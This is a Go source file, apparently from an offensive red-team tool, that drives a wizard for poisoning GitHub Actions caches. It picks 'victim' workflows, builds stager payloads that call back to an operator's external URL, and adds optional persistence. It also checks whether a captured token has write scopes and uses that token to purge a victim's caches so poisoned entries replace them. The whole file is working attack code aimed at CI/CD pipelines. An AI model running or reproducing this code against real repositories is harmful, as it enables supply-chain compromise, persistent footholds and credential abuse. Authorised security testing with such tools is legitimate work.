// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package tui

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
	"github.com/boostsecurityio/smokedmeat/internal/counter"
	"github.com/boostsecurityio/smokedmeat/internal/rye"
)

func (m *Model) cachePoisonAvailability(vuln *Vulnerability) (available bool, reason string) {
	if vuln == nil {
		return false, ""
	}
	if !vuln.CachePoisonWriter {
		if vuln.CachePoisonReason != "" {
			return false, vuln.CachePoisonReason
		}
		return false, "selected vulnerability is not a supported cache writer"
	}
	if len(vuln.CachePoisonVictims) == 0 {
		return false, "no victim workflow found"
	}
	if len(readyCachePoisonVictims(vuln.CachePoisonVictims)) == 0 {
		return false, "no runtime-ready victim workflow found"
	}
	return true, ""
}

func (m *Model) selectedCachePoisonVictim() (victim *cachepoison.VictimCandidate) {
	if m.wizard == nil || m.wizard.SelectedVuln == nil {
		return nil
	}
	victims := readyCachePoisonVictims(m.wizard.SelectedVuln.CachePoisonVictims)
	if len(victims) == 0 {
		return nil
	}
	idx := m.wizard.CachePoisonVictimIndex
	if idx < 0 || idx >= len(victims) {
		idx = 0
		m.wizard.CachePoisonVictimIndex = 0
	}
	victim = &victims[idx]
	return victim
}

func (m *Model) cycleCachePoisonVictim() {
	if m.wizard == nil || !m.wizard.CachePoisonEnabled {
		return
	}
	victimCount := len(readyCachePoisonVictims(m.wizard.SelectedVuln.CachePoisonVictims))
	if victimCount <= 1 {
		return
	}
	m.wizard.CachePoisonVictimIndex = (m.wizard.CachePoisonVictimIndex + 1) % victimCount
}

func readyCachePoisonVictims(victims []cachepoison.VictimCandidate) []cachepoison.VictimCandidate {
	ready := make([]cachepoison.VictimCandidate, 0, len(victims))
	for _, victim := range victims {
		if victim.Ready {
			ready = append(ready, victim)
		}
	}
	return ready
}

func (m *Model) prepareWizardStager(vuln *Vulnerability, injCtx rye.InjectionContext) (*rye.Stager, string, error) {
	if m.wizard == nil {
		return nil, "", fmt.Errorf("wizard is not active")
	}
	stager := rye.NewStager(m.config.ExternalURL(), injCtx)
	payload := prependGateTriggers(stager.Generate().Raw, vuln)
	if m.wizard.PersistenceAttempt {
		payload = decoratePayloadForPersistence(payload)
	}
	m.pendingCachePoison = nil
	m.wizard.VictimStagerID = ""

	if !m.wizard.CachePoisonEnabled {
		if m.wizard.PersistenceAttempt {
			callback, err := m.registerPersistentCallback(stager.ID, "", m.wizard.DwellTime, callbackMetadataForVulnerability(vuln))
			if err != nil {
				return stager, payload, err
			}
			if callback != nil {
				m.upsertCallback(*callback)
			}
			return stager, payload, nil
		}
		if err := m.registerStagerForVuln(stager.ID, m.wizard.DwellTime, m.wizard.CallbackBudget, vuln); err != nil {
			return stager, payload, err
		}
		return stager, payload, nil
	}

	victim := m.selectedCachePoisonVictim()
	if victim == nil {
		return stager, payload, fmt.Errorf("cache poison victim selection is invalid")
	}
	victimDwell := cachePoisonPersistentDwell(m.wizard.DwellTime)
	if m.kitchenClient == nil {
		return stager, payload, fmt.Errorf("not connected to kitchen")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	purgeToken, purgeKey, purgeKeyPrefix := m.cachePoisonPurgeRequest(victim)
	resp, err := m.kitchenClient.PrepareCachePoisonDeployment(ctx, counter.PrepareCachePoisonRequest{
		SessionID:        m.config.SessionID,
		ExternalURL:      m.config.ExternalURL(),
		WriterStagerID:   stager.ID,
		WriterRepository: vuln.Repository,
		WriterWorkflow:   vuln.Workflow,
		WriterJob:        vuln.Job,
		Victim:           *victim,
		VictimDwellTime:  victimDwell.String(),
		PurgeToken:       purgeToken,
		PurgeKey:         purgeKey,
		PurgeKeyPrefix:   purgeKeyPrefix,
	})
	if err != nil {
		return stager, payload, err
	}
	if resp.VictimCallback.ID != "" {
		m.upsertCallback(resp.VictimCallback)
	}
	if resp.WriterCallback.ID != "" {
		m.upsertCallback(resp.WriterCallback)
	}

	m.pendingCachePoison = &CachePoisonWaitingState{
		WriterStagerID: stager.ID,
		Victim:         *victim,
		VictimStagerID: resp.VictimStagerID,
	}
	m.wizard.VictimStagerID = resp.VictimStagerID
	if resp.PurgedKey != "" {
		if resp.PurgedCacheCount > 0 {
			m.AddOutput("info", fmt.Sprintf("Purged %d matching Actions caches for %s (%s on %s)", resp.PurgedCacheCount, victim.Repository, resp.PurgedKey, resp.PurgedCacheRef))
		} else {
			m.AddOutput("info", fmt.Sprintf("No matching Actions caches to purge for %s (%s on %s)", victim.Repository, resp.PurgedKey, resp.PurgedCacheRef))
		}
	}
	if resp.PurgedKey == "" && resp.PurgedKeyPrefix != "" {
		if resp.PurgedCacheCount > 0 {
			m.AddOutput("info", fmt.Sprintf("Purged %d matching Actions caches for %s (%s on %s)", resp.PurgedCacheCount, victim.Repository, resp.PurgedKeyPrefix, resp.PurgedCacheRef))
		} else {
			m.AddOutput("info", fmt.Sprintf("No matching Actions caches to purge for %s (%s on %s)", victim.Repository, resp.PurgedKeyPrefix, resp.PurgedCacheRef))
		}
	}
	return stager, payload, nil
}

func callbackMetadataForVulnerability(vuln *Vulnerability) map[string]string {
	if vuln == nil {
		return nil
	}
	return map[string]string{
		"repository":       vuln.Repository,
		"workflow":         vuln.Workflow,
		"job":              vuln.Job,
		"persistence_mode": "resident",
	}
}

func (m *Model) cachePoisonPurgeRequest(victim *cachepoison.VictimCandidate) (token, key, keyPrefix string) {
	if victim == nil || m.tokenInfo == nil || m.wizard == nil {
		return "", "", ""
	}
	if !m.wizard.CachePoisonReplace {
		return "", "", ""
	}
	if m.wizard.DeliveryMethod == DeliveryCopyOnly || m.wizard.DeliveryMethod == DeliveryManualSteps {
		return "", "", ""
	}

	if !m.activeTokenAllowsCacheReplacement() {
		return "", "", ""
	}
	token = strings.TrimSpace(m.tokenInfo.Value)
	key = cachepoison.ReplacementKey(*victim)
	if key != "" {
		return token, key, ""
	}
	keyPrefix = cachepoison.ReplacementKeyPrefix(*victim)
	if keyPrefix == "" {
		return "", "", ""
	}

	return token, "", keyPrefix
}

func (m *Model) activeTokenAllowsCacheReplacement() bool {
	if m.tokenInfo == nil || strings.TrimSpace(m.tokenInfo.Value) == "" {
		return false
	}
	if permissionAllowsWrite(m.activeDispatchPermissions(), "actions") || permissionAllowsWrite(m.activeDispatchPermissions(), "workflows") {
		return true
	}

	for _, scope := range m.tokenInfo.Scopes {
		scope = strings.ToLower(strings.TrimSpace(scope))
		switch scope {
		case "repo", "public_repo":
			return true
		}
		if (strings.Contains(scope, "actions") || strings.Contains(scope, "workflow")) && strings.Contains(scope, "write") {
			return true
		}
	}

	return false
}
